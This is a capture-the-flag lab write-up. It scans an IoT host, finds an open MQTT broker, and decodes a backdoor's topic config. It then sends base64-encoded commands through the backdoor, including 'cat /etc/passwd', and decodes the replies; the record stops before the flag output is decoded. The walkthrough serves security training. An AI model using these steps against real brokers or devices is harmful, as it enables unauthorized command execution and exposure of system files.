----
John likes to live in a very Internet connected world. Maybe too connected...
---

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/adcc4fe6db75bd8f327a51ea55a770aa.png)
### Analyze the network

 Start Machine

John was working on his smart home appliances when he noticed weird traffic going across the network. Can you help him figure out what these weird network communications are?  
  
_Note: the machine may take 3-5 minutes to fully boot._

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.240.105 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.240.105:1883
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-04 13:52 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:52
Completed NSE at 13:52, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:52
Completed NSE at 13:52, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:52
Completed NSE at 13:52, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 13:52
Completed Parallel DNS resolution of 1 host. at 13:52, 0.01s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 13:52
Scanning 10.10.240.105 [1 port]
Discovered open port 1883/tcp on 10.10.240.105
Completed Connect Scan at 13:52, 0.20s elapsed (1 total ports)
Initiating Service scan at 13:52
Scanning 1 service on 10.10.240.105
Completed Service scan at 13:53, 6.41s elapsed (1 service on 1 host)
NSE: Script scanning 10.10.240.105.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:53
Completed NSE at 13:53, 6.90s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:53
Completed NSE at 13:53, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:53
Completed NSE at 13:53, 0.00s elapsed
Nmap scan report for 10.10.240.105
Host is up, received user-set (0.20s latency).
Scanned at 2023-03-04 13:52:54 EST for 14s

PORT     STATE SERVICE                  REASON  VERSION
1883/tcp open  mosquitto version 2.0.14 syn-ack
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     frontdeck/camera: {"id":16866657077475732531,"yaxis":78.33908,"xaxis":28.465668,"zoom":4.663113,"movement":true}
|     $SYS/broker/uptime: 352 seconds
|     $SYS/broker/load/messages/received/15min: 29.40
|     $SYS/broker/messages/sent: 534
|     $SYS/broker/store/messages/bytes: 305
|     $SYS/broker/load/sockets/15min: 0.24
|     $SYS/broker/load/bytes/received/5min: 2936.59
|     $SYS/broker/bytes/sent: 2137
|     $SYS/broker/clients/inactive: -1
|     $SYS/broker/load/sockets/1min: 2.59
|     $SYS/broker/load/messages/sent/5min: 62.53
|     $SYS/broker/load/messages/sent/15min: 29.40
|     storage/thermostat: {"id":17070290351156969688,"temperature":23.033842}
|     $SYS/broker/clients/disconnected: -1
|     $SYS/broker/load/bytes/sent/5min: 250.20
|     $SYS/broker/store/messages/count: 52
|     $SYS/broker/clients/connected: 2
|     patio/lights: {"id":6597963764048772861,"color":"ORANGE","status":"OFF"}
|     $SYS/broker/publish/bytes/received: 17921
|     $SYS/broker/load/messages/sent/1min: 90.20
|     livingroom/speaker: {"id":16598049595873910445,"gain":68}
|     $SYS/broker/load/bytes/sent/15min: 117.65
|     $SYS/broker/messages/received: 534
|     $SYS/broker/load/bytes/received/15min: 1384.31
|     $SYS/broker/bytes/received: 25170
|     $SYS/broker/version: mosquitto version 2.0.14
|     $SYS/broker/clients/active: 2
|     $SYS/broker/load/bytes/received/1min: 4150.03
|     $SYS/broker/messages/stored: 52
|     $SYS/broker/load/messages/received/1min: 90.20
|     $SYS/broker/load/sockets/5min: 0.65
|     $SYS/broker/load/bytes/sent/1min: 360.79
|_    $SYS/broker/load/messages/received/5min: 62.53

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:53
Completed NSE at 13:53, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:53
Completed NSE at 13:53, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:53
Completed NSE at 13:53, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.68 seconds



https://securitycafe.ro/2022/04/08/iot-pentesting-101-how-to-hack-mqtt-the-standard-for-iot-messaging/

┌──(witty㉿kali)-[~/Downloads]
└─$ mosquitto_sub --help                                      
mosquitto_sub is a simple mqtt client that will subscribe to a set of topics and print all messages it receives.
mosquitto_sub version 2.0.11 running on libmosquitto 2.0.11.

Usage: mosquitto_sub {[-h host] [--unix path] [-p port] [-u username] [-P password] -t topic | -L URL [-t topic]}
                     [-c] [-k keepalive] [-q qos] [-x session-expiry-interval]
                     [-C msg_count] [-E] [-R] [--retained-only] [--remove-retained] [-T filter_out] [-U topic ...]
                     [-F format]
                     [-W timeout_secs]
                     [-A bind_address] [--nodelay]
                     [-i id] [-I id_prefix]
                     [-d] [-N] [--quiet] [-v]
                     [--will-topic [--will-payload payload] [--will-qos qos] [--will-retain]]
                     [{--cafile file | --capath dir} [--cert file] [--key file]
                       [--ciphers ciphers] [--insecure]
                       [--tls-alpn protocol]
                       [--tls-engine engine] [--keyform keyform] [--tls-engine-kpass-sha1]]
                       [--tls-use-os-certs]
                     [--psk hex-key --psk-identity identity [--ciphers ciphers]]
                     [--proxy socks-url]
                     [-D command identifier value]
       mosquitto_sub --help

 -A : bind the outgoing socket to this host/ip address. Use to control which interface
      the client communicates over.
 -c : disable clean session/enable persistent client mode
      When this argument is used, the broker will be instructed not to clean existing sessions
      for the same client id when the client connects, and sessions will never expire when the
      client disconnects. MQTT v5 clients can change their session expiry interval with the -x
      argument.
 -C : disconnect and exit after receiving the 'msg_count' messages.
 -d : enable debug messages.
 -D : Define MQTT v5 properties. See the documentation for more details.
 -E : Exit once all subscriptions have been acknowledged by the broker.
 -F : output format.
 -h : mqtt host to connect to. Defaults to localhost.
 -i : id to use for this client. Defaults to mosquitto_sub_ appended with the process id.
 -I : define the client id as id_prefix appended with the process id. Useful for when the
      broker is using the clientid_prefixes option.
 -k : keep alive in seconds for this client. Defaults to 60.
 -L : specify user, password, hostname, port and topic as a URL in the form:
      mqtt(s)://[username[:password]@]host[:port]/topic
 -N : do not add an end of line character when printing the payload.
 -p : network port to connect to. Defaults to 1883 for plain MQTT and 8883 for MQTT over TLS.
 -P : provide a password
 -q : quality of service level to use for the subscription. Defaults to 0.
 -R : do not print stale messages (those with retain set).
 -t : mqtt topic to subscribe to. May be repeated multiple times.
 -T : topic string to filter out of results. May be repeated.
 -u : provide a username
 -U : unsubscribe from a topic. May be repeated.
 -v : print published messages verbosely.
 -V : specify the version of the MQTT protocol to use when connecting.
      Can be mqttv5, mqttv311 or mqttv31. Defaults to mqttv311.
 -W : Specifies a timeout in seconds how long to process incoming MQTT messages.
 -x : Set the session-expiry-interval property on the CONNECT packet. Applies to MQTT v5
      clients only. Set to 0-4294967294 to specify the session will expire in that many
      seconds after the client disconnects, or use -1, 4294967295, or ∞ for a session
      that does not expire. Defaults to -1 if -c is also given, or 0 if -c not given.
 --help : display this message.
 --nodelay : disable Nagle's algorithm, to reduce socket sending latency at the possible
             expense of more packets being sent.
 --pretty : print formatted output rather than minimised output when using the
            JSON output format option.
 --quiet : don't print error messages.
 --random-filter : only print a percentage of received messages. Set to 100 to have all
                   messages printed, 50.0 to have half of the messages received on average
                   printed, and so on.
 --retained-only : only handle messages with the retained flag set, and exit when the
                   first non-retained message is received.
 --remove-retained : send a message to the server to clear any received retained messages
                     Use -T to filter out messages you do not want to be cleared.
 --unix : connect to a broker through a unix domain socket instead of a TCP socket,
          e.g. /tmp/mosquitto.sock
 --will-payload : payload for the client Will, which is sent by the broker in case of
                  unexpected disconnection. If not given and will-topic is set, a zero
                  length message will be sent.
 --will-qos : QoS level for the client Will.
 --will-retain : if given, make the client Will retained.
 --will-topic : the topic on which to publish the client Will.
 --cafile : path to a file containing trusted CA certificates to enable encrypted
            certificate based communication.
 --capath : path to a directory containing trusted CA certificates to enable encrypted
            communication.
 --cert : client certificate for authentication, if required by server.
 --key : client private key for authentication, if required by server.
 --keyform : keyfile type, can be either "pem" or "engine".
 --ciphers : openssl compatible list of TLS ciphers to support.
 --tls-version : TLS protocol version, can be one of tlsv1.3 tlsv1.2 or tlsv1.1.
                 Defaults to tlsv1.2 if available.
 --insecure : do not check that the server certificate hostname matches the remote
              hostname. Using this option means that you cannot be sure that the
              remote host is the server you wish to connect to and so is insecure.
              Do not use this option in a production environment.
 --tls-engine : If set, enables the use of a SSL engine device.
 --tls-engine-kpass-sha1 : SHA1 of the key password to be used with the selected SSL engine.
 --tls-use-os-certs : Load and trust OS provided CA certificates.
 --psk : pre-shared-key in hexadecimal (no leading 0x) to enable TLS-PSK mode.
 --psk-identity : client identity string for TLS-PSK mode.
 --proxy : SOCKS5 proxy URL of the form:
           socks5h://[username[:password]@]hostname[:port]
           Only "none" and "username" authentication is supported.

See https://mosquitto.org/ for more information.

┌──(witty㉿kali)-[~/Downloads]
└─$ mosquitto_sub -t '#' -h 10.10.240.105 -v
livingroom/speaker {"id":10593576727318323717,"gain":54}
storage/thermostat {"id":11092748480171619791,"temperature":24.2332}
patio/lights {"id":16536307148111616156,"color":"BLUE","status":"OFF"}
storage/thermostat {"id":8228176182145485308,"temperature":24.128681}
frontdeck/camera {"id":367081050936808613,"yaxis":-156.65256,"xaxis":-146.40971,"zoom":2.0949152,"movement":false}
kitchen/toaster {"id":17800130455033928925,"in_use":true,"temperature":157.4325,"toast_time":218}
livingroom/speaker {"id":12511973279359126257,"gain":49}
storage/thermostat {"id":12791486279851104596,"temperature":24.29337}
patio/lights {"id":2275355594759920494,"color":"GREEN","status":"OFF"}
livingroom/speaker {"id":12724214336178552171,"gain":75}
kitchen/toaster {"id":3749064691759735184,"in_use":false,"temperature":155.58688,"toast_time":211}
yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/config eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==
storage/thermostat {"id":2454558248705756317,"temperature":23.456451}
frontdeck/camera {"id":13266633173167500390,"yaxis":-47.450607,"xaxis":129.08398,"zoom":2.4484673,"movement":true}
patio/lights {"id":7892724724492620436,"color":"BLUE","status":"ON"}
livingroom/speaker {"id":15022055973200841034,"gain":75}
storage/thermostat {"id":7532308379210334539,"temperature":24.296665}
kitchen/toaster {"id":3552980291374399786,"in_use":true,"temperature":153.43048,"toast_time":204}
livingroom/speaker {"id":14486635161469568713,"gain":63}
patio/lights {"id":8788499509590528545,"color":"BLUE","status":"OFF"}
storage/thermostat {"id":1130962396510902112,"temperature":23.36056}
frontdeck/camera {"id":3939280371083473522,"yaxis":32.105774,"xaxis":-157.80782,"zoom":3.3361146,"movement":false}
kitchen/toaster {"id":14474030541197274013,"in_use":true,"temperature":151.21402,"toast_time":128}
livingroom/speaker {"id":2787858915569536773,"gain":47}
storage/thermostat {"id":16572782734984862506,"temperature":23.90949}
patio/lights {"id":18358801309652639810,"color":"PURPLE","status":"OFF"}
storage/thermostat {"id":14822829872726243044,"temperature":23.406485}


┌──(witty㉿kali)-[~/Downloads]
└─$ echo "eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==" | base64 -d
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","registered_commands":["HELP","CMD","SYS"],"pub_topic":"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub","sub_topic":"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"} 

Once the _Mosquitto_ server is up and running, you have to spawn two other shells, one for the subscriber and one for the publisher. The subscriber listens for any topic updates, and the publisher sends update messages to a specific topic.

┌──(witty㉿kali)-[~/Downloads]
└─$ mosquitto_pub -h 10.10.240.105 -t XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub -m 'hi'

┌──(witty㉿kali)-[~/Downloads]
└─$ mosquitto_sub -h 10.10.240.105 -t U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub
SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk=


┌──(witty㉿kali)-[~/Downloads]
└─$ echo 'SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk=' | base64 -d
Invalid message format.
Format: base64({"id": "<backdoor id>", "cmd": "<command>", "arg": "<argument>"}) 

so change it

{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "cat /etc/passwd"}

┌──(witty㉿kali)-[~/Downloads]
└─$ echo '{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "cat /etc/passwd"}' | base64 -w 0
eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAiY2F0IC9ldGMvcGFzc3dkIn0K 

┌──(witty㉿kali)-[~/Downloads]
└─$ mosquitto_pub -h 10.10.240.105 -t XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub -m 'eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAiY2F0IC9ldGMvcGFzc3dkIn0K'

┌──(witty㉿kali)-[~/Downloads]
└─$ mosquitto_sub -h 10.10.240.105 -t U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub
SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk=
eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoicm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaFxuZGFlbW9uOng6MToxOmRhZW1vbjovdXNyL3NiaW46L3Vzci9zYmluL25vbG9naW5cbmJpbjp4OjI6MjpiaW46L2JpbjovdXNyL3NiaW4vbm9sb2dpblxuc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luXG5zeW5jOng6NDo2NTUzNDpzeW5jOi9iaW46L2Jpbi9zeW5jXG5nYW1lczp4OjU6NjA6Z2FtZXM6L3Vzci9nYW1lczovdXNyL3NiaW4vbm9sb2dpblxubWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW5cbmxwOng6Nzo3OmxwOi92YXIvc3Bvb2wvbHBkOi91c3Ivc2Jpbi9ub2xvZ2luXG5tYWlsOng6ODo4Om1haWw6L3Zhci9tYWlsOi91c3Ivc2Jpbi9ub2xvZ2luXG5uZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luXG51dWNwOng6MTA6MTA6dXVjcDovdmFyL3Nwb29sL3V1Y3A6L3Vzci9zYmluL25vbG9naW5cbnByb3h5Ong6MTM6MTM6cHJveHk6L2JpbjovdXNyL3NiaW4vbm9sb2dpblxud3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpblxuYmFja3VwOng6MzQ6MzQ6YmFja3VwOi92YXIvYmFja3VwczovdXNyL3NiaW4vbm9sb2dpblxubGlzdDp4OjM4OjM4Ok1haWxpbmcgTGlzdCBNYW5hZ2VyOi92YXIvbGlzdDovdXNyL3NiaW4vbm9sb2dpblxuaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW5cbmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpblxubm9ib2R5Ong6NjU1MzQ6NjU1MzQ6bm9ib2R5Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpblxuX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luXG5jaGFsbGVuZ2U6eDoxMDAwOjEwMDA6Oi9ob21lL2NoYWxsZW5nZTovYmluL3NoXG4ifQ==

┌──(witty㉿kali)-[~/Downloads]
└─$ >....                                                                           
ovdXNyL3NiaW4vbm9sb2dpblxuYmFja3VwOng6MzQ6MzQ6YmFja3VwOi92YXIvYmFja3VwczovdXNyL3NiaW4vbm9sb2dpblxubGlzdDp4OjM4OjM4Ok1haWxpbmcgTGlzdCBNYW5hZ2VyOi92YXIvbGlzdDovdXNyL3NiaW4vbm9sb2dpblxuaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW5cbmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpblxubm9ib2R5Ong6NjU1MzQ6NjU1MzQ6bm9ib2R5Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpblxuX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luXG5jaGFsbGVuZ2U6eDoxMDAwOjEwMDA6Oi9ob21lL2NoYWxsZW5nZTovYmluL3NoXG4ifQ==' | base64 -d
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nchallenge:x:1000:1000::/home/challenge:/bin/sh\n"}  

now let's get flag

{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "ls"}

┌──(witty㉿kali)-[~/Downloads]
└─$ echo '{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "ls"}'| base64 -w 0
eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAibHMifQo= 

┌──(witty㉿kali)-[~/Downloads]
└─$ mosquitto_pub -h 10.10.240.105 -t XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub -m 'eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAibHMifQo='

┌──(witty㉿kali)-[~/Downloads]
└─$ mosquitto_sub -h 10.10.240.105 -t U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub
SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk=
eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoicm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaFxuZGFlbW9uOng6MToxOmRhZW1vbjovdXNyL3NiaW46L3Vzci9zYmluL25vbG9naW5cbmJpbjp4OjI6MjpiaW46L2JpbjovdXNyL3NiaW4vbm9sb2dpblxuc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luXG5zeW5jOng6NDo2NTUzNDpzeW5jOi9iaW46L2Jpbi9zeW5jXG5nYW1lczp4OjU6NjA6Z2FtZXM6L3Vzci9nYW1lczovdXNyL3NiaW4vbm9sb2dpblxubWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW5cbmxwOng6Nzo3OmxwOi92YXIvc3Bvb2wvbHBkOi91c3Ivc2Jpbi9ub2xvZ2luXG5tYWlsOng6ODo4Om1haWw6L3Zhci9tYWlsOi91c3Ivc2Jpbi9ub2xvZ2luXG5uZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luXG51dWNwOng6MTA6MTA6dXVjcDovdmFyL3Nwb29sL3V1Y3A6L3Vzci9zYmluL25vbG9naW5cbnByb3h5Ong6MTM6MTM6cHJveHk6L2JpbjovdXNyL3NiaW4vbm9sb2dpblxud3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpblxuYmFja3VwOng6MzQ6MzQ6YmFja3VwOi92YXIvYmFja3VwczovdXNyL3NiaW4vbm9sb2dpblxubGlzdDp4OjM4OjM4Ok1haWxpbmcgTGlzdCBNYW5hZ2VyOi92YXIvbGlzdDovdXNyL3NiaW4vbm9sb2dpblxuaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW5cbmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpblxubm9ib2R5Ong6NjU1MzQ6NjU1MzQ6bm9ib2R5Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpblxuX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luXG5jaGFsbGVuZ2U6eDoxMDAwOjEwMDA6Oi9ob21lL2NoYWxsZW5nZTovYmluL3NoXG4ifQ==
eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZy50eHRcbiJ9

┌──(witty㉿kali)-[~/Downloads]
└─$ echo 'eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZy50eHRcbiJ9' |base64 -d

{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"flag.txt\n"}  

so there is

let's open it :)

{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "cat flag.txt"}

┌──(witty㉿kali)-[~/Downloads]
└─$ echo '{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "cat flag.txt"}' | base64 -w 0      
eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAiY2F0IGZsYWcudHh0In0K   

┌──(witty㉿kali)-[~/Downloads]
└─$ mosquitto_pub -h 10.10.240.105 -t XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub -m 'eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAiY2F0IGZsYWcudHh0In0K'

┌──(witty㉿kali)-[~/Downloads]
└─$ mosquitto_sub -h 10.10.240.105 -t U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub
SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk=
eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoicm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaFxuZGFlbW9uOng6MToxOmRhZW1vbjovdXNyL3NiaW46L3Vzci9zYmluL25vbG9naW5cbmJpbjp4OjI6MjpiaW46L2JpbjovdXNyL3NiaW4vbm9sb2dpblxuc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luXG5zeW5jOng6NDo2NTUzNDpzeW5jOi9iaW46L2Jpbi9zeW5jXG5nYW1lczp4OjU6NjA6Z2FtZXM6L3Vzci9nYW1lczovdXNyL3NiaW4vbm9sb2dpblxubWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW5cbmxwOng6Nzo3OmxwOi92YXIvc3Bvb2wvbHBkOi91c3Ivc2Jpbi9ub2xvZ2luXG5tYWlsOng6ODo4Om1haWw6L3Zhci9tYWlsOi91c3Ivc2Jpbi9ub2xvZ2luXG5uZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luXG51dWNwOng6MTA6MTA6dXVjcDovdmFyL3Nwb29sL3V1Y3A6L3Vzci9zYmluL25vbG9naW5cbnByb3h5Ong6MTM6MTM6cHJveHk6L2JpbjovdXNyL3NiaW4vbm9sb2dpblxud3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpblxuYmFja3VwOng6MzQ6MzQ6YmFja3VwOi92YXIvYmFja3VwczovdXNyL3NiaW4vbm9sb2dpblxubGlzdDp4OjM4OjM4Ok1haWxpbmcgTGlzdCBNYW5hZ2VyOi92YXIvbGlzdDovdXNyL3NiaW4vbm9sb2dpblxuaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW5cbmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpblxubm9ib2R5Ong6NjU1MzQ6NjU1MzQ6bm9ib2R5Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpblxuX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luXG5jaGFsbGVuZ2U6eDoxMDAwOjEwMDA6Oi9ob21lL2NoYWxsZW5nZTovYmluL3NoXG4ifQ==
